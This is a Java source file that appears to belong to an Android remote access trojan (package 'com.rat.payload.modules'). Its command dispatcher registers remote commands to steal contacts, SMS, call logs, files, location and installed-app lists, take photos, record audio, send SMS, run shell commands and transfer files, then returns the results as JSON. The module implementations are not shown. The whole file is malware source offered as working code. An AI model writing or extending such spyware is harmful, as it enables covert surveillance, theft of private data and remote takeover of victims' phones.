package com.rat.payload.modules;

import android.content.Context;
import android.util.Log;

import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class CommandHandler {

    private static final String TAG = "CmdHandler";
    private Context context;
    private Map<String, Command> commands;

    public CommandHandler(Context ctx) {
        this.context = ctx.getApplicationContext();
        registerCommands();
    }

    private void registerCommands() {
        commands = new HashMap<>();
        commands.put("get_contacts", new GetContacts(context));
        commands.put("get_sms", new GetSMS(context));
        commands.put("get_location", new LocationModule(context));
        commands.put("get_files", new FileModule(context));
        commands.put("get_device_info", (args) -> DeviceInfo.getFullInfo(context));
        commands.put("take_photo", new CameraModule(context));
        commands.put("record_audio", new AudioModule(context));
        commands.put("send_sms", new SendSMS(context));
        commands.put("get_call_log", new CallLogModule(context));
        commands.put("get_apps", new AppsModule(context));
        commands.put("shell", new ShellModule(context));
        commands.put("download_file", new DownloadModule(context));
        commands.put("upload_file", new UploadModule(context));
        commands.put("vibrate", (args) -> {
            android.os.Vibrator v = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null) v.vibrate(1000);
            JSONObject r = new JSONObject();
            r.put("status", "ok");
            return r;
        });
        commands.put("toast", (args) -> {
            String msg = args.optString("message", "Rat says hi");
            new android.os.Handler(android.os.Looper.getMainLooper()).post(() ->
                android.widget.Toast.makeText(context, msg, android.widget.Toast.LENGTH_LONG).show()
            );
            JSONObject r = new JSONObject();
            r.put("status", "ok");
            return r;
        });
    }

    public JSONObject execute(String action, JSONObject args) {
        try {
            Command cmd = commands.get(action);
            if (cmd != null) {
                JSONObject result = cmd.execute(args);
                result.put("action", action);
                result.put("status", "success");
                return result;
            } else {
                JSONObject err = new JSONObject();
                err.put("action", action);
                err.put("status", "error");
                err.put("message", "Unknown command: " + action);
                return err;
            }
        } catch (Exception e) {
            Log.e(TAG, "execute error: " + e.getMessage());
            JSONObject err = new JSONObject();
            err.put("action", action);
            err.put("status", "error");
            err.put("message", e.getMessage());
            return err;
        }
    }

    public interface Command {
        JSONObject execute(JSONObject args) throws Exception;
    }
}
